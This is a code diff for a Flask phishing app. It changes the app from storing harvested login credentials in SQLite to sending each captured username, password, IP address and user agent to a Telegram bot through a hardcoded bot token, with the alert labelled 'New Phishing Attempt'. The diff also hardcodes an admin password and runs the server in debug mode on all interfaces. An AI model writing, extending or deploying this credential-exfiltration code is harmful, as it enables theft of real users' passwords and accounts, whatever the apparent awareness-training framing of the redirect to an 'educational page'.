@@ -1,64 +1,76 @@
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify
-import sqlite3
 import datetime
 import hashlib
 import os
+import requests
+import threading
+import time
 from functools import wraps
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
-DATABASE = os.getenv('DATABASE_PATH', 'phishing_data.db')
 
-def init_db():
-    """Initialize the database"""
+# Telegram Bot Configuration
+BOT_TOKEN = '8456610849:AAF7tP7m0Psw2Q4bE_mKPjVjUvITGu4cw8U'
+CHAT_ID = None  # Will be set on first message
+
+def handle_telegram_webhook():
+    """Handle incoming messages from Telegram"""
+    global CHAT_ID
+    base_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
+    
     try:
-        conn = sqlite3.connect(DATABASE)
-        c = conn.cursor()
+        response = requests.get(f'{base_url}getUpdates')
+        updates = response.json()
         
-        # Create the submissions table if it doesn't exist
-        c.execute('''CREATE TABLE IF NOT EXISTS submissions
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  username TEXT NOT NULL,
-                  password TEXT NOT NULL,
-                  ip_address TEXT,
-                  user_agent TEXT,
-                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-        
-        conn.commit()
-        conn.close()
-        print("Database initialized successfully")
-    except sqlite3.Error as e:
-        print(f"Database initialization error: {e}")
-        raise
+        if updates.get('ok') and updates.get('result'):
+            for update in updates['result']:
+                if 'message' in update and 'text' in update['message']:
+                    chat_id = update['message']['chat']['id']
+                    message_text = update['message']['text']
+                    
+                    # Handle /start command
+                    if message_text == '/start':
+                        CHAT_ID = chat_id
+                        welcome_message = (
+                            "🔥 *Activated* 🔥\n\n"
+                            "✅ Bot is now configured and ready\n"
+                            "📡 You will receive phishing attempts in real-time\n"
+                            "🔒 Your Chat ID has been securely stored\n\n"
+                            "Bot Status: *ONLINE*"
+                        )
+                        send_to_telegram(welcome_message)
+                        # Clear updates to avoid processing old messages
+                        requests.get(f'{base_url}getUpdates?offset={update["update_id"] + 1}')
+                        return True
+    except Exception as e:
+        print(f'Error handling webhook: {e}')
+    return False
 
-# Ensure the database is initialized when the app starts
-with app.app_context():
-    init_db()
+def send_to_telegram(message):
+    """Send message to Telegram"""
+    global CHAT_ID
+    base_url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
+    
+    # If we don't have the chat ID yet, try to handle /start command
+    if CHAT_ID is None:
+        handle_telegram_webhook()
+    
+    try:
+        payload = {
+            'chat_id': CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }
+        response = requests.post(f'{base_url}sendMessage', data=payload)
+        return response.ok
+    except Exception as e:
+        print(f'Error sending message: {e}')
+        return False
 
 # Admin credentials (change these in production)
 ADMIN_USERNAME = 'admin'
 ADMIN_PASSWORD = 'securepassword123'
-
-def init_db():
-    """Initialize the database"""
-    try:
-        conn = sqlite3.connect(DATABASE)
-        c = conn.cursor()
-        
-        # Create the submissions table if it doesn't exist
-        c.execute('''CREATE TABLE IF NOT EXISTS submissions
-                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
-                  username TEXT,
-                  password TEXT,
-                  ip_address TEXT,
-                  user_agent TEXT,
-                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-        conn.commit()
-        conn.close()
-
-    except sqlite3.Error as e:
-        print(f"Database initialization error: {e}")
-        raise
 
 def require_admin(f):
     @wraps(f)
@@ -83,13 +95,15 @@ def login():
         ip_address = request.remote_addr
         user_agent = request.headers.get('User-Agent')
         
-        # Store in database
-        conn = sqlite3.connect(DATABASE)
-        c = conn.cursor()
-        c.execute("INSERT INTO submissions (username, password, ip_address, user_agent) VALUES (?, ?, ?, ?)",
-                  (username, password, ip_address, user_agent))
-        conn.commit()
-        conn.close()
+        # Send data to Telegram
+        message = f"<b>🎣 New Phishing Attempt</b>\n\n" \
+                 f"📧 Username: <code>{username}</code>\n" \
+                 f"🔑 Password: <code>{password}</code>\n" \
+                 f"🌐 IP Address: <code>{ip_address}</code>\n" \
+                 f"📱 User Agent: <code>{user_agent}</code>\n" \
+                 f"⏰ Time: <code>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>"
+        
+        send_to_telegram(message)
         
         # Redirect to educational page
         return redirect(url_for('educational_page'))
@@ -119,25 +133,10 @@ def admin_login():
 @app.route('/admin/dashboard')
 @require_admin
 def admin_dashboard():
-    """Admin dashboard to view results"""
-    conn = sqlite3.connect(DATABASE)
-    c = conn.cursor()
-    c.execute("SELECT * FROM submissions ORDER BY timestamp DESC")
-    submissions = c.fetchall()
-    conn.close()
-    
-    return render_template('admin.html', submissions=submissions)
+    """Admin dashboard"""
+    return render_template('admin.html', message='Data is being sent to Telegram bot')
 
-@app.route('/admin/clear')
-@require_admin
-def clear_data():
-    """Clear all submitted data"""
-    conn = sqlite3.connect(DATABASE)
-    c = conn.cursor()
-    c.execute("DELETE FROM submissions")
-    conn.commit()
-    conn.close()
-    return redirect(url_for('admin_dashboard'))
+
 
 @app.route('/admin/logout')
 def admin_logout():
@@ -145,6 +144,23 @@ def admin_logout():
     session.pop('admin_logged_in', None)
     return redirect(url_for('index'))
 
+def init_bot():
+    """Initialize the Telegram bot and wait for /start command"""
+    print("🤖 Waiting for /start command in Telegram...")
+    while CHAT_ID is None:
+        if handle_telegram_webhook():
+            print("✅ Bot initialized successfully!")
+            break
+        time.sleep(2)  # Check every 2 seconds
+
 if __name__ == '__main__':
-    init_db()
+    import threading
+    import time
+    
+    # Start bot initialization in a separate thread
+    bot_thread = threading.Thread(target=init_bot)
+    bot_thread.daemon = True
+    bot_thread.start()
+    
+    # Run the Flask app
     app.run(host='0.0.0.0', port=5000, debug=True)
